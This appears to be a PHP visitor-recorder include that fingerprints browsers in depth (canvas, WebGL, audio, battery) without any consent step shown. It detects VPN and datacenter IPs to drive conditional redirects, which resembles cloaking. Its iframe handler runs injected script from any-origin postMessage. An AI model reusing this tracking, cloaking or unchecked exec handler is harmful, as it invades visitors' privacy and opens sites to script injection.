<?php
//ini_set('display_errors', 1);
//ini_set('display_startup_errors', 1);
//error_reporting(E_ALL);

// include.php — recorder + server-hit logging + conditional client action emit
// Collects extended client footprints and pushes to server.php (init + events).

if (session_status() !== PHP_SESSION_ACTIVE) {
  @session_start();
}

function h($s)
{
  return htmlspecialchars((string) $s, ENT_QUOTES);
}
function safe($s)
{
  return preg_replace('/[^a-zA-Z0-9_\-\.]/', '_', (string) $s);
}

$sid = session_id();
if (!$sid) {
  $sid = bin2hex(random_bytes(16));
  @session_id($sid);
}
$SESS_BASE = __DIR__ . '/sessions';
@is_dir($SESS_BASE) || @mkdir($SESS_BASE, 0775, true);
$THIS_SESSION_DIR = $SESS_BASE . '/' . safe($sid);
@is_dir($THIS_SESSION_DIR) || @mkdir($THIS_SESSION_DIR, 0775, true);

$settingsFile = __DIR__ . '/settings.json';

// ---------- Helpers ----------
function ip_cache_read($ip)
{
  $f = __DIR__ . '/sessions/_ipcache/' . safe($ip) . '.json';
  if (!is_file($f))
    return null;
  $j = json_decode(@file_get_contents($f), true);
  return is_array($j) ? $j : null;
}
function ip_cache_write($ip, $data)
{
  $dir = __DIR__ . '/sessions/_ipcache';
  @is_dir($dir) || @mkdir($dir, 0775, true);
  $f = $dir . '/' . safe($ip) . '.json';
  @file_put_contents($f, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES), LOCK_EX);
}
function ip_info($ip)
{
  $c = ip_cache_read($ip);
  if ($c)
    return $c;
  $url = 'http://ip-api.com/json/' . rawurlencode($ip) . '?fields=66846719';
  $ch = curl_init($url);

  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

  $resp = curl_exec($ch);

  curl_close($ch);

  $data = json_decode($resp, true);
  if (is_array($data) && ($data['status'] ?? '') === 'success') {
    ip_cache_write($ip, $data);
    return $data;
  }
  $fallback = ['status' => 'fail', 'message' => 'ip-api error', 'query' => $ip, 'country' => 'unknown', 'countryCode' => 'XX'];
  ip_cache_write($ip, $fallback);
  return $fallback;
}
// --- VPN/Proxy/Hosting helpers for include.php ---

/**
 * Return whichever IP-info array is already present in include.php.
 * We don't assume the exact variable name; we check a few common ones.
 */
function current_ipinfo(): array
{
  foreach (['ipinfo', 'IPINFO', 'IP_API_DATA', 'server_ipinfo'] as $k) {
    if (isset($GLOBALS[$k]) && is_array($GLOBALS[$k]))
      return $GLOBALS[$k];
  }
  return ip_info(client_ip_from_headers($_SERVER));
}

/**
 * Conservative detection of VPN/proxy/hosting endpoints.
 * Trust explicit flags if present; otherwise use a safe keyword heuristic.
 */
function ipinfo_is_vpn_or_hosting(array $ipinfo): bool
{
  $proxy = isset($ipinfo['proxy']) ? (bool) $ipinfo['proxy'] : false;
  $hosting = isset($ipinfo['hosting']) ? (bool) $ipinfo['hosting'] : false;
  if ($proxy || $hosting)
    return true;

  // Heuristic on org/isp (kept conservative to limit false positives)
  $org = strtolower((string) ($ipinfo['org'] ?? ''));
  $isp = strtolower((string) ($ipinfo['isp'] ?? ''));
  $hay = $org . ' ' . $isp;

  $keywords = [
    'vpn',
    'virtual private network',
    'proxy',
    'tor',
    'exit node',
    'colo',
    'colocation',
    'datacenter',
    'data center',
    'hosting',
    'cloud',
    'vps',
    'digitalocean',
    'linode',
    'vultr',
    'ovh',
    'hetzner',
    'google cloud',
    'google llc',
    'amazon',
    'aws',
    'amazon web services',
    'microsoft azure',
    'azure',
    'choopa',
    'leaseweb',
    'contabo',
    'upcloud',
    'ikoula',
    'scaleway'
  ];
  foreach ($keywords as $kw) {
    if ($kw !== '' && str_contains($hay, $kw))
      return true;
  }
  return false;
}

/**
 * Return a non-empty "vpn name" only when the IP looks like VPN/Proxy/Hosting.
 * Prefer 'org' then fall back to 'isp'. Otherwise return ''.
 */
function derive_vpn_name(array $ipinfo): string
{
  if (!ipinfo_is_vpn_or_hosting($ipinfo))
    return '';
  $name = (string) ($ipinfo['org'] ?? '');
  if ($name === '')
    $name = (string) ($ipinfo['isp'] ?? '');
  return $name;
}

/**
 * Map current request IP to country code (or 'localhost' on private ranges).
 */
function derive_ip_country_for_include(array $ipinfo, string $ip): string
{
  // private/local ranges → 'localhost'
  $isLocal = in_array($ip, ['127.0.0.1', '::1'], true)
    || preg_match('/^(10\\.|192\\.168\\.|172\\.(1[6-9]|2[0-9]|3[0-1])\\.)/', $ip);
  if ($isLocal)
    return 'localhost';
  $cc = (string) ($ipinfo['countryCode'] ?? '');
  return $cc;
}

function client_ip_from_headers(array $server)
{
  $candidates = ['HTTP_CF_CONNECTING_IP', 'HTTP_TRUE_CLIENT_IP', 'HTTP_X_REAL_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED'];
  foreach ($candidates as $h) {
    if (!empty($server[$h])) {
      $parts = array_map('trim', explode(',', $server[$h]));
      foreach ($parts as $ip) {
        if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE))
          return $ip;
      }
    }
  }
  return $server['REMOTE_ADDR'] ?? '';
}
function rule_is_active($rule)
{
  if (!is_array($rule))
    return false;
  if (isset($rule['enabled']) && !$rule['enabled'])
    return false;

  $now = time();

  if (!empty($rule['start_at'])) {
    $ts = strtotime((string) $rule['start_at']);
    if ($ts !== false && $now < $ts)
      return false;
  }
  if (!empty($rule['end_at'])) {
    $ts = strtotime((string) $rule['end_at']);
    if ($ts !== false && $now > $ts)
      return false;
  }
  return true;
}

function normalize_rules($rules)
{
  $out = [];
  foreach (($rules ?? []) as $r) {
    if (!is_array($r))
      continue;
    if (!rule_is_active($r))
      continue;
    if (!isset($r['priority']) || !is_numeric($r['priority'])) {
      $r['priority'] = 100;
    } else {
      $r['priority'] = (int) $r['priority'];
    }
    $out[] = $r;
  }
  usort($out, function ($a, $b) {
    $pa = $a['priority'] ?? 100;
    $pb = $b['priority'] ?? 100;
    if ($pa == $pb)
      return 0;
    return ($pa < $pb) ? -1 : 1; // lower = earlier
  });
  return $out;
}

function load_settings_file($file)
{
  $raw = @file_get_contents($file);
  $arr = json_decode($raw, true);
  if (!is_array($arr))
    return [];
  $rules = array_values(array_filter($arr, 'is_array'));
  return normalize_rules($rules);
}


function ua_parse_simple($ua)
{
  $u = strtolower((string) $ua);
  $isBot = (bool) preg_match('/bot|crawler|spider|preview|fetcher|slurp|facebookexternalhit|twitterbot|linkedinbot|whatsapp|telegram|bingpreview|curl|wget|python-requests|golang|httpclient|axios|vkshare/i', $u);
  $b = $isBot ? 'Bot' : (str_contains($u, 'edg') ? 'Edge' : (str_contains($u, 'chrome') ? 'Chrome' : (str_contains($u, 'safari') ? 'Safari' : (str_contains($u, 'firefox') ? 'Firefox' : 'Other'))));
  $o = $isBot ? 'Bot' : (str_contains($u, 'windows') ? 'Windows' : (str_contains($u, 'android') ? 'Android' : (str_contains($u, 'iphone') || str_contains($u, 'ipad') ? 'iOS' : (str_contains($u, 'mac os') ? 'macOS' : (str_contains($u, 'linux') ? 'Linux' : 'Other')))));
  return [$b, $o, $isBot];
}
function norm_list($v)
{
  if (is_array($v))
    return array_values(array_filter(array_map('strval', $v)));
  $v = trim((string) $v);
  return $v === '' ? [] : array_values(array_filter(array_map('trim', explode(',', $v))));
}
function op_match($expect, $actual)
{
   //print_r($actual);

  if (!is_array($expect) || !isset($expect['op'])) {
    if ($expect === 'is_not_empty')
      return (string) $actual !== '';
    if ($expect === 'empty')
      return (string) $actual === '';
    if (is_string($expect) && str_starts_with($expect, 'regex:/') && str_ends_with($expect, '/')) {
      $pat = substr($expect, 6, -1);
      return @preg_match('/' . $pat . '/', (string) $actual) === 1;
    }
    return (string) $expect === (string) $actual;
  }

  $op = strtolower($expect['op']);
  $val = $expect['value'] ?? null;
  $sact = (string) $actual;

  switch ($op) {
    case 'empty':
      return $actual === null || $actual === '';

    case 'not_empty':
      return $actual !== null && $actual !== '';

    case 'eq':
      return (string) $val === $sact;

    case 'neq':
      return (string) $val !== $sact;

    case 'gt':
      if (is_numeric($sact) && is_numeric($val))
        return (float) $sact > (float) $val;
      return $sact > (string) $val;

    case 'lt':
      if (is_numeric($sact) && is_numeric($val))
        return (float) $sact < (float) $val;
      return $sact < (string) $val;

    case 'gte':
      if (is_numeric($sact) && is_numeric($val))
        return (float) $sact >= (float) $val;
      return $sact >= (string) $val;

    case 'lte':
      if (is_numeric($sact) && is_numeric($val))
        return (float) $sact <= (float) $val;
      return $sact <= (string) $val;

    case 'between':
      if (is_array($val)) {
        $min = $val[0] ?? null;
        $max = $val[1] ?? null;
      } else {
        $parts = explode(',', (string) $val, 2);
        $min = $parts[0] ?? null;
        $max = $parts[1] ?? null;
      }
      $minOk = ($min === null || $min === '') ? true :
        (is_numeric($sact) && is_numeric($min) ? (float) $sact >= (float) $min : $sact >= (string) $min);
      $maxOk = ($max === null || $max === '') ? true :
        (is_numeric($sact) && is_numeric($max) ? (float) $sact <= (float) $max : $sact <= (string) $max);
      return $minOk && $maxOk;

    case 'contains':
      return stripos($sact, (string) $val) !== false;

    case 'not_contains':
      return stripos($sact, (string) $val) === false;

    case 'in':
      return in_array($sact, norm_list($val), true);

    case 'not_in':
      return !in_array($sact, norm_list($val), true);

    case 'regex':
      $pat = (string) $val;
      return $pat !== '' && @preg_match('/' . $pat . '/', $sact) === 1;

    default:
      return (string) $val === $sact;
  }
}


function conditions_match_server($conds)
{
  // Server-known fields only (client/IP-API handled in server.php; we only gate server-side actions here)
  $method = $_SERVER['REQUEST_METHOD'] ?? '';
  $ref = $_SERVER['HTTP_REFERER'] ?? '';
  $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
  [$browser, $os] = ua_parse_simple($ua);
  $path = parse_url(($_SERVER['REQUEST_URI'] ?? ''), PHP_URL_PATH) ?? '';
  $qs = [];
  parse_str($_SERVER['QUERY_STRING'] ?? '', $qs);
  $ipinfo = current_ipinfo();
  //print_r( $ipinfo); exit;
  foreach (($conds ?? []) as $k => $expect) {
    // print_r("<br>");
    // print_r($k);
    // print_r($expect);
    switch ($k) {
      case 'http_method':
        if (!op_match($expect, $method))
          return false;
        break;

      case 'query_params':
        if (!is_array($expect))
          return false;
        foreach ($expect as $n => $v) {
          $act = $qs[$n] ?? null;
          if (!op_match($v, $act))
            return false;
        }
        break;

      case 'post_params':
        if (!is_array($expect))
          return false;
        foreach ($expect as $n => $v) {
          $act = $_POST[$n] ?? null;
          if (!op_match($v, $act))
            return false;
        }
        break;

      case 'ip':
        if (!op_match($expect, $_SERVER['REMOTE_ADDR'] ?? ''))
          return false;
        break;
      case 'referrer_contains':
        if (is_array($expect) && isset($expect['op'])) {
          if (!op_match($expect, $ref))
            return false;
        } else if (stripos($ref, (string) $expect) === false)
          return false;
        break;
      case 'ua_contains':
        if (stripos($ua, (string) (is_array($expect) ? ($expect['value'] ?? '') : $expect)) === false)
          return false;
        break;
      case 'browser':
        if (!op_match($expect, $browser))
          return false;
        break;
      case 'os':
        if (!op_match($expect, $os))
          return false;
        break;
      case 'path_regex':
        if (@preg_match((string) (is_array($expect) ? ($expect['value'] ?? '') : $expect), $path) !== 1)
          return false;
        break;
      case 'cookie_has':
        if (!isset($_COOKIE[is_array($expect) ? ($expect['value'] ?? '') : $expect]))
          return false;
        break;
      case 'header_has':
        $hh = $_SERVER[strtoupper('HTTP_' . str_replace('-', '_', (is_array($expect) ? ($expect['value'] ?? '') : $expect)))] ?? '';
        if ($hh === '')
          return false;
        break;

      // ---------- NEW / FIXED: IP-intel conditions directly in include.php ----------

      case 'ip_country': {
        $ip = (string) ($_SERVER['REMOTE_ADDR'] ?? '');
        $act = derive_ip_country_for_include($ipinfo, $ip);
        if (!op_match($expect, $act))
          return false;
        break;
      }

      case 'proxy_ip': {
        // true if either proxy or hosting (common for VPN POPs)
        $isProxyLike = ipinfo_is_vpn_or_hosting($ipinfo);
        $actual = $isProxyLike ? 'true' : 'false';
        if (!op_match($expect, $actual))
          return false;
        break;
      }

      case 'vpn_name': {
        // Only non-empty when IP looks like VPN/proxy/hosting;
        // otherwise '' so "not_empty" won't match for normal ISPs.
        $vpn = derive_vpn_name($ipinfo); // '' on normal access networks
        if (!op_match($expect, $vpn))
          return false;
        break;
      }
      default:
        break; // ip_country etc -> server.php
    }
  }
  return true;
}

// ---------- Ensure meta.json exists; tag bots ----------
$mf = $THIS_SESSION_DIR . '/meta.json';
$existing = is_file($mf) ? (json_decode(@file_get_contents($mf), true) ?: []) : [];
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
[$browser, $os, $isBot] = ua_parse_simple($ua);

if (!$existing) {
  $ip = client_ip_from_headers($_SERVER);
  $existing = [
    'sid' => $sid,
    'created_at' => gmdate('c'),
    'updated_at' => gmdate('c'),
    'ip' => $ip,
    'meta_from_browser' => [
      'url' => ($_SERVER['REQUEST_URI'] ?? ''),
      'referrer' => $_SERVER['HTTP_REFERER'] ?? '',
      'ua' => $ua,
      'lang' => '',
      'tz' => '',
      'screen' => ['w' => '', 'h' => ''],
      'viewport' => ['w' => '', 'h' => ''],
      'page_http_method' => 'GET'
    ],
    'server' => [
      'request' => [
        'method' => $_SERVER['REQUEST_METHOD'] ?? 'GET',
        'uri' => $_SERVER['REQUEST_URI'] ?? '',
        'host' => $_SERVER['HTTP_HOST'] ?? '',
        'headers' => array_filter($_SERVER, fn($k) => str_starts_with($k, 'HTTP_'), ARRAY_FILTER_USE_KEY),
        'user_agent' => $ua
      ]
    ],
    'ip_info' => ip_info($ip),
    'tags' => [],
    'action_taken' => null
  ];
}
$existing['updated_at'] = gmdate('c');
if (!isset($existing['tags']) || !is_array($existing['tags']))
  $existing['tags'] = [];
if ($isBot && !in_array('bot', $existing['tags'], true))
  $existing['tags'][] = 'bot';

@file_put_contents($mf, json_encode($existing, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES), LOCK_EX);

// ---------- Always record a server-side hit ----------
$sv_id = 'sv-' . (string) microtime(true);
$sv_path = $THIS_SESSION_DIR . '/' . safe($sv_id) . '.ldjson';
@file_put_contents($sv_path, json_encode([
  't' => 0,
  'type' => 'server_hit',
  'data' => [
    'uri' => $_SERVER['REQUEST_URI'] ?? '',
    'method' => $_SERVER['REQUEST_METHOD'] ?? 'GET',
    'ua' => $ua,
    'accept' => $_SERVER['HTTP_ACCEPT'] ?? '',
    'ref' => $_SERVER['HTTP_REFERER'] ?? ''
  ]
], JSON_UNESCAPED_SLASHES) . "\n", LOCK_EX);

// ---------- Determine whether to execute immediate server actions ----------
$ALLOW_ACTION_JS = false;
$rules = load_settings_file($settingsFile);
if (!empty($rules)) {
  foreach ($rules as $r) {
    $criteria = is_array($r['criteria'] ?? null) ? $r['criteria'] : [];
    if (!in_array('Server-Side', $criteria, true))
      continue;
    if (!conditions_match_server($r['conditions'] ?? []))
      continue;
    $ALLOW_ACTION_JS = true;

    if (!headers_sent()) {
      $type = $r['action']['type'] ?? '';
      $data = $r['action']['data'] ?? [];
      if ($type === 'server-301-redirect' && !empty($data['url'])) {
        header('Location: ' . $data['url'], true, 301);
        exit;
      }
      if ($type === 'server-302-redirect' && !empty($data['url'])) {
        header('Location: ' . $data['url'], true, 302);
        exit;
      }
      if ($type === 'server-include' && !empty($data['file'])) {
        @include __DIR__ . '/' . basename($data['file']);
      }
      if ($type === 'server-echo-data' && isset($data['text'])) {
        echo $data['text'];
      }
    }
    break; // first matching server-side rule only
  }
}

// Compute absolute server.php URL
$serverUrl = rtrim(dirname($_SERVER['SCRIPT_NAME']), '/\\') . '/server.php';
$serverUrl = (str_ends_with($serverUrl, '/server.php') ? $serverUrl : $serverUrl . '/server.php');
$serverUrl = $serverUrl[0] === '/' ? $serverUrl : ('/' . $serverUrl);
?>
<script>
  (() => {

    // ---- Simulation guard (replay iframe) ----
    if (window.self !== window.top) {
      const post = (type, data) => { try { window.parent.postMessage({ __replay: true, event: type, data }, '*'); } catch (_) { } };
      document.addEventListener('click', (e) => { const a = e.target?.closest?.('a[href]'); if (!a) return; e.preventDefault(); post('nav_attempt', { url: a.href }); try { history.pushState({}, '', a.getAttribute('href')); } catch (_) { } }, { capture: true });
      document.addEventListener('submit', (e) => { e.preventDefault(); const f = e.target; const fd = new FormData(f); const o = {}; fd.forEach((v, k) => o[k] = v); post('form_attempt', { action: f.action || location.href, method: (f.method || 'GET').toUpperCase(), data: o }); try { history.pushState({}, '', f.action || location.href); } catch (_) { } }, { capture: true });
      const _ps = history.pushState; history.pushState = function (s, t, u) { try { _ps.apply(history, arguments); } catch (_) { } post('history_change', { href: String(u || location.href) }); };
      const _rs = history.replaceState; history.replaceState = function (s, t, u) { try { _rs.apply(history, arguments); } catch (_) { } post('history_change', { href: String(u || location.href) }); };
      window.open = function (u, n, f) { post('window_open', { url: u, name: n, features: f }); return null; };
      window.addEventListener('message', (e) => {
        const m = e.data || {}; if (!m.__replay) return; const t = m.type, d = m.data || {}; try {
          if (t === 'scroll') { window.scrollTo(d.x || 0, d.y || 0); }
          else if (t === 'click') { const x = d.x || 0, y = d.y || 0; const el = document.elementFromPoint(x, y); if (el) el.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true, clientX: x, clientY: y })); }
          else if (t === 'resize') { window.dispatchEvent(new Event('resize')); }
          else if (t === 'storage_set') { (d.store === 'session' ? sessionStorage : localStorage).setItem(d.key, d.value); }
          else if (t === 'storage_remove') { (d.store === 'session' ? sessionStorage : localStorage).removeItem(d.key); }
          else if (t === 'storage_clear') { (d.store === 'session' ? sessionStorage : localStorage).clear(); }
          else if (t === 'history') { window.dispatchEvent(new Event('popstate')); }
          else if (t === 'navigate') { if (d.url) try { history.replaceState({}, '', d.url); window.dispatchEvent(new Event('popstate')); } catch (_) { } }
          else if (t === 'exec') { if (d.script) { const s = document.createElement('script'); s.textContent = d.script; document.documentElement.appendChild(s); s.remove(); } }
        } catch (_) { }
      });
      try { window.parent.postMessage({ __replay: true, event: 'sim_ready', data: { vw: innerWidth, vh: innerHeight } }, '*'); } catch (_) { }
      return;
    }

    // ---- Recorder (top-level only) ----
    const SERVER = "<?= h($serverUrl) ?>";
    const SID = "<?= h($sid) ?>";
    const START = performance.now();
    const S = { visitId: null, queue: [], flushTimer: null, lastMouse: 0, lastScroll: 0 };

    const postJSON = (payload, beacon = false) => {
      const body = JSON.stringify(payload);
      if (beacon && navigator.sendBeacon) { navigator.sendBeacon(SERVER, new Blob([body], { type: 'application/json' })); return Promise.resolve({ ok: true }); }
      return fetch(SERVER, { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Requested-With': 'Recorder' }, body });
    };

    // ================== EXTENDED FOOTPRINT COLLECTORS ==================
    function bool(v) { return v ? 'true' : 'false'; }
    function csv(arr) { try { return (arr || []).join(','); } catch (_) { return ''; } }

    function collectInitialFootprints() {
      const FP = {};
      try {
        FP.ua = navigator.userAgent || '';
        FP.navigator_language = navigator.language || '';
        FP.navigator_languages = csv(navigator.languages || []);
        FP.navigator_platform = navigator.platform || '';
        FP.navigator_vendor = navigator.vendor || '';
        FP.navigator_hw_conc = String(navigator.hardwareConcurrency ?? '');
        FP.navigator_device_mem = String(navigator.deviceMemory ?? '');
        FP.navigator_max_touch = String(navigator.maxTouchPoints ?? '');

        FP.supports_cookies = bool(navigator.cookieEnabled === true);
        FP.supports_localStorage = (function () { try { localStorage.setItem('_t', '1'); localStorage.removeItem('_t'); return 'true'; } catch (e) { return 'false'; } })();
        FP.supports_sessionStorage = (function () { try { sessionStorage.setItem('_t', '1'); sessionStorage.removeItem('_t'); return 'true'; } catch (e) { return 'false'; } })();
        FP.doNotTrack = (navigator.doNotTrack || window.doNotTrack || '') + '';

        FP.screen_width = String(screen.width ?? '');
        FP.screen_height = String(screen.height ?? '');
        FP.screen_availWidth = String(screen.availWidth ?? '');
        FP.screen_availHeight = String(screen.availHeight ?? '');
        FP.screen_colorDepth = String(screen.colorDepth ?? '');
        FP.devicePixelRatio = String(window.devicePixelRatio ?? '');
        FP.win_innerWidth = String(window.innerWidth ?? '');
        FP.win_innerHeight = String(window.innerHeight ?? '');
        FP.zoom_level = String(Math.round((window.devicePixelRatio || 1) * 100));
        FP.scrollbar_widths = (function () { const el = document.createElement('div'); el.style.cssText = 'position:absolute;top:-9999px;width:100px;height:100px;overflow:scroll;'; document.documentElement.appendChild(el); const v = el.offsetWidth - el.clientWidth; const h = el.offsetHeight - el.clientHeight; el.remove(); return v + ',' + h; })();

        if (screen.orientation) { FP.orientation_type = screen.orientation.type || ''; FP.orientation_angle = String(screen.orientation.angle ?? ''); }

        try { FP.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || ''; } catch (_) { FP.timezone = ''; }
        FP.tz_offset_minutes = String(new Date().getTimezoneOffset() * -1);
        FP.locale = (navigator.languages && navigator.languages[0]) || navigator.language || '';
        FP.language = navigator.language || '';

        FP.media_colorScheme = (matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : (matchMedia('(prefers-color-scheme: light)').matches ? 'light' : ''));
        FP.night_mode = bool(FP.media_colorScheme === 'dark');
        FP.media_reducedMotion = (matchMedia('(prefers-reduced-motion: reduce)').matches ? 'reduce' : '');
        FP.media_colorGamut = (['srgb', 'p3', 'rec2020'].find(g => matchMedia(`(color-gamut: ${g})`).matches) || '') || '';
        FP.media_anyHover = matchMedia('(any-hover: hover)').matches ? 'hover' : 'none';
        FP.media_anyPointer = matchMedia('(any-pointer: fine)').matches ? 'fine' : (matchMedia('(any-pointer: coarse)').matches ? 'coarse' : '');

        FP.permissions_snapshot = '';

        FP.quirk_color_depth = String(screen.colorDepth ?? '');
        FP.quirk_pixel_depth = String(screen.pixelDepth ?? screen.colorDepth ?? '');
        FP.quirk_scrollbar_styling = bool((window.CSS && CSS.supports && (CSS.supports('scrollbar-color: auto') || CSS.supports('scrollbar-width: thin'))));
        FP.quirk_css_supports = bool(typeof CSS !== 'undefined' && CSS.supports);

        FP.default_system_font = getComputedStyle(document.documentElement).getPropertyValue('font-family') || '';
      } catch (_) { }
      return FP;
    }

    async function collectSettledFootprints() {
      const FP = {};
      FP.fonts_list = ''; FP.fonts_system = '';

      try {
        const nc = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (nc) { FP.net_effectiveType = nc.effectiveType || ''; FP.net_rtt = String(nc.rtt || ''); FP.net_downlink = String(nc.downlink || ''); }
      } catch (_) { }

      if (navigator.getBattery) { try { const b = await navigator.getBattery(); FP.battery_level = String(b.level); FP.battery_charging = String(!!b.charging); FP.battery_discharging_time = String(b.dischargingTime || ''); } catch (_) { } }

      FP.sensors_available = '';

      try {
        FP.plugins = Array.from(navigator.plugins || []).map(p => p.name).join(',');
        FP.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => m.type).join(',');
      } catch (_) { }

      try {
        const can = document.createElement('canvas'); const x = can.getContext('2d'); can.width = 180; can.height = 30;
        x.textBaseline = 'top'; x.font = '14px "Ahem", sans-serif'; x.fillStyle = '#f60'; x.fillRect(0, 0, 180, 30); x.fillStyle = '#069'; x.fillText(navigator.userAgent, 2, 2);
        FP.canvas_hash = await sha256hex(can.toDataURL());
      } catch (_) { }
      try {
        const c = document.createElement('canvas'); const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
        if (gl) {
          const dbg = gl.getExtension('WEBGL_debug_renderer_info');
          FP.webgl_vendor = (dbg && gl.getParameter(0x9245)) || gl.getParameter(gl.VENDOR) || '';
          FP.webgl_renderer = (dbg && gl.getParameter(0x9246)) || gl.getParameter(gl.RENDERER) || '';
          FP.webgl_param_vendor = FP.webgl_vendor;
          FP.webgl_param_renderer = FP.webgl_renderer;
          FP.webgl_param_shading_lang = gl.getParameter(gl.SHADING_LANGUAGE_VERSION) || '';
          FP.webgl_extensions = (gl.getSupportedExtensions() || []).join(',');
        }
      } catch (_) { }
      try {
        const Ctx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
        if (Ctx) {
          const actx = new Ctx(1, 44100, 44100); const osc = actx.createOscillator(); const comp = actx.createDynamicsCompressor();
          osc.connect(comp); comp.connect(actx.destination); osc.start(0);
          const buf = await actx.startRendering(); const ch0 = buf.getChannelData(0).subarray(4500, 4600);
          FP.audio_hash = await sha256hex(new Blob([new Float32Array(ch0)])); FP.audio_sample_rate = String(actx.sampleRate || '');
        }
      } catch (_) { }

      try {
        if ('gpu' in navigator && navigator.gpu) {
          const adapter = await navigator.gpu.requestAdapter();
          if (adapter) {
            FP.webgpu_adapter_features = Array.from(adapter.features || []).join(',');
            const l = adapter.limits || {}; FP.webgpu_limits = Object.keys(l).map(k => k + ':' + l[k]).join(',');
          }
        }
      } catch (_) { }

      try {
        FP.cookie_enabled = String(!!navigator.cookieEnabled);
        if (navigator.storage && navigator.storage.estimate) {
          const est = await navigator.storage.estimate(); FP.storage_quota = String(est.quota || ''); FP.storage_usage = String(est.usage || '');
        }
      } catch (_) { }
      try { FP.indexeddb_available = String(!!window.indexedDB); } catch (_) { }
      try { FP.cachestorage_available = String(!!window.caches); } catch (_) { }
      try { FP.sw_registrations = String((await navigator.serviceWorker?.getRegistrations?.())?.length ?? ''); } catch (_) { }
      FP.partitioned_cookies = '';

      FP.net_online = String(navigator.onLine);
      FP.webrtc_ice_summary = '';
      FP.fetch_priority_support = String('request' in Request.prototype && 'priority' in Request.prototype ? true : false);
      FP.http2_push_support = '';

      try { FP.perf_memory = (performance.memory ? JSON.stringify(performance.memory) : ''); } catch (_) { }
      try {
        const navEntry = (performance.getEntriesByType && performance.getEntriesByType('navigation')[0]) || performance.navigation;
        FP.perf_navType = (navEntry && (navEntry.type || navEntry.redirectCount != null ? 'navigate' : '')) || '';
        FP.perf_timing_present = String(!!performance.timing);
      } catch (_) { }
      FP.perf_raf_jitter = ''; FP.perf_settimeout_jitter = '';

      FP.sec_cross_origin_isolated = String(!!crossOriginIsolated);
      FP.sec_shared_array_buffer = String(typeof SharedArrayBuffer === 'function');
      try { if (document.hasStorageAccess) { FP.sec_storage_access = String(await document.hasStorageAccess()); } } catch (_) { }
      FP.sec_coop_coep = (crossOriginIsolated === true || typeof SharedArrayBuffer === 'function') ? 'true' : '';

      FP.os_pref_languages = csv(navigator.languages || []);
      FP.os_prefers_contrast = (matchMedia('(prefers-contrast: more)').matches ? 'more' : (matchMedia('(prefers-contrast: less)').matches ? 'less' : ''));
      FP.os_forced_colors = String(matchMedia('(forced-colors: active)').matches);
      FP.os_inverted_colors = String(matchMedia('(inverted-colors: inverted)').matches);

      try { Intl.DateTimeFormat('foo'); } catch (e) { FP.quirk_intl_error_wording = String(e && e.message || ''); }
      try { FP.quirk_stack_trace_style = (new Error('x')).stack ? 'has' : 'none'; } catch (_) { FP.quirk_stack_trace_style = ''; }
      FP.quirk_css_vendor_prefixes = [
        ('-webkitAppearance' in document.documentElement.style) ? 'webkit' : '',
        ('-mozAppearance' in document.documentElement.style) ? 'moz' : '',
        ('-msAccelerator' in document.documentElement.style) ? 'ms' : '',
      ].filter(Boolean).join(',');

      return FP;
    }

    // crypto helper
    async function sha256hex(input) {
      const data = input instanceof Blob ? await input.arrayBuffer() : new TextEncoder().encode(String(input));
      const h = await crypto.subtle.digest('SHA-256', data);
      return [...new Uint8Array(h)].map(b => b.toString(16).padStart(2, '0')).join('');
    }

    // ================== PIPELINE ==================
    const START_META = (function meta() {
      const tz = (Intl.DateTimeFormat().resolvedOptions().timeZone || '');
      const dpr = window.devicePixelRatio || 1;
      const base = {
        page_http_method: 'GET',
        url: location.href, referrer: document.referrer || '',
        ua: navigator.userAgent, lang: navigator.language || '', platform: navigator.platform || '', tz,
        screen: { w: screen.width, h: screen.height, availW: screen.availWidth, availH: screen.availHeight, dpr },
        viewport: { w: innerWidth, h: innerHeight },
        cookieEnabled: navigator.cookieEnabled, historyLength: history.length, ts: Date.now(),
        fp_initial: null
      };
      base.fp_initial = collectInitialFootprints();
      return base;
    })();

    function enqueue(ev) { S.queue.push(ev); if (!S.flushTimer) S.flushTimer = setTimeout(flush, 1000); if (S.queue.length >= 25) flush(); }
    async function flush() { try { clearTimeout(S.flushTimer); S.flushTimer = null; if (!S.queue.length || !S.visitId) return; const batch = S.queue.splice(0, S.queue.length); const payload = { mode: 'events', sid: SID, vid: S.visitId, events: batch }; const useBeacon = (document.visibilityState !== 'visible'); const res = await postJSON(payload, useBeacon); if (!res.ok) { S.queue.unshift(...batch); } } catch (_) { } }
    setInterval(() => { if (S.queue.length) flush(); }, 1000);
    document.addEventListener('visibilitychange', () => { if (document.visibilityState !== 'visible') flush(); }, { capture: true });
    window.addEventListener('pagehide', () => flush(), { capture: true });
    window.addEventListener('beforeunload', () => postJSON({ mode: 'events', sid: SID, vid: S.visitId, events: [{ type: 'beforeunload', t: performance.now() - START, data: {} }] }, true), { capture: true });

    (async () => {
      try {
        // INIT
        const res = await postJSON({ mode: 'init', sid: SID, meta: START_META });
        const data = await res.json();
        S.visitId = data.visit_id;

        // ship fp_initial also as event
        enqueue({ type: 'fp_initial', t: performance.now() - START, data: START_META.fp_initial });

        // Heartbeats
        setInterval(() => postJSON({ mode: 'heartbeat', sid: SID, vid: S.visitId, t: performance.now() - START }, true), 5000);

        // Post-load settled footprints
        try { const fpSettled = await collectSettledFootprints(); enqueue({ type: 'fp_settled', t: performance.now() - START, data: fpSettled }); } catch (_) { }

        <?php // Wire action only when server-side rule matched; client triggers honored ?>
        const action = data.action || null;
        const criteria = Array.isArray(data.criteria) ? data.criteria : [];
        if (action && criteria.includes('Server-Side')) {
          const triggers = criteria.filter(c => c !== 'Server-Side');
          const run = () => doAction(action);
          if (triggers.length === 0) { run(); }
          else {
            for (const ev of triggers) {
              if (ev === 'search') { const i = document.querySelector('input[type=search],input[name=q]'); if (i) i.addEventListener('input', run, { once: true }); continue; }
